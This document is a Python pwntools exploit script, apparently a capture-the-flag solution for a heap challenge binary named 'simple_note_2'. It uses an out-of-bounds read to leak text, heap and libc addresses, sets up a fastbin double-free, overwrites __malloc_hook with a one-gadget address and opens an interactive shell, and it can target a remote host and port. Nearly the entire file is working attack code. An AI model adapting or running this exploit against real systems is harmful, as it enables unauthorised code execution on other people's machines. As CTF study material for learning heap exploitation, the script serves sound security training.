from pwn import *

puts_off = 0x6f690

def alloc(size, data):

    r.sendlineafter('choice:\n', '1')
    r.sendlineafter('note.\n', str(size))
    r.sendlineafter('note.\n', data)

    return

def free(idx):

    r.sendlineafter('choice:\n', '3')
    r.sendlineafter('note.\n', str(idx))

    return

def dump(idx):

    r.sendlineafter('choice:\n', '2')
    r.sendlineafter('note.\n', str(idx))

    r.recvuntil('Content:')

    return u64(r.recv(6).ljust(8, '\x00'))

def pwn():

    # Thanks to the OOB read we can read arbitrary addresses
    # At offset -88 there's the following data:
    #
    # 0x555555756000:    0x0000000000000000  0x0000555555756008
    #
    # At address 0x555555756008, there's a pointer pointing
    # to itself which we can use to get text segment's base address
    text     = dump(-11) - 0x202008
    array    = text + 0x202060
    puts_got = text + 0x201f90

    alloc(0x68, 'A'*8)
    alloc(0x68, 'B'*8)

    free(0)
    free(1)

    # The 2nd chunk will be pointing to the 1st chunk which
    # will be placed at the base of the heap + 0x10
    # By entering 1 byte and thanks to the fact that
    # there's no null-byte termination, we can recover
    # heap's base address
    alloc(0x68, '')

    heap   = dump(0) & 0xffffffffffffff00
    chunk1 = heap   + 0x10
    chunk_ = chunk1 + 0x8
    chunk2 = heap   + 0x80
    chunk3 = heap   + 0xf0

    log.info("Heap:          0x{:x}".format(heap))
    log.info("text:          0x{:x}".format(text))

    # Place puts GOT entry
    alloc(0x68, p64(puts_got) + p64(chunk1))

    # Calculate the offset needed to reach the
    # heap chunk from the bss array
    leak_idx = (chunk1 - array) / 8

    puts        = dump(leak_idx)
    libc        = puts - puts_off
    malloc_hook = libc + 0x3c4b10
    one_shot    = libc + 0xf0274

    log.info("Libc:          0x{:x}".format(libc))
    log.info("__malloc_hook: 0x{:x}".format(malloc_hook))

    # Create a double-free scenario
    free((chunk_ - array) / 8)
    free(0)
    free(1)

    # printfastbin
    # (0x20)     fastbin[0]: 0x0
    # (0x30)     fastbin[1]: 0x0
    # (0x40)     fastbin[2]: 0x0
    # (0x50)     fastbin[3]: 0x0
    # (0x60)     fastbin[4]: 0x0
    # (0x70)     fastbin[5]: 0x555555757000 --> 0x555555757070 --> 0x555555757000
    # (0x80)     fastbin[6]: 0x0

    # Fastbin attack
    alloc(0x68, p64(malloc_hook - 0x30 + 0xd))
    alloc(0x68, 'E'*8)
    alloc(0x68, 'F'*8)
    alloc(0x68, 'G'*0x13 + p64(one_shot))

    # trigger __malloc_hook with double-free
    #
    # x/5gx 0x555555756060
    # 0x555555756060: 0x0000555555757010  0x0000555555757080
    # 0x555555756070: 0x0000555555757010  0x00007ffff7dd1afd
    free(0)
    free(2)

    r.interactive()

if __name__ == "__main__":
    log.info("For remote: {} HOST PORT".format(sys.argv[0]))
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        pwn()
    else:
        r = process('./simple_note_2')
        pause()
        pwn()
